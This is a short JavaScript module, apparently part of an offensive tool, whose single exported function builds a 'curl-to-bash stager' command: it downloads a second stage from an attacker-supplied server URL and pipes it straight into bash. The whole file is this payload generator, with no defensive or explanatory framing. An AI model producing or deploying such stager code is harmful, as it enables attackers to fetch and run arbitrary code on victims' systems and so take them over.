function generate(token, serverUrl) {
    // Direct curl-to-bash stager
    return `curl -s ${serverUrl}/stage2 | bash`;
}

module.exports = { generate };
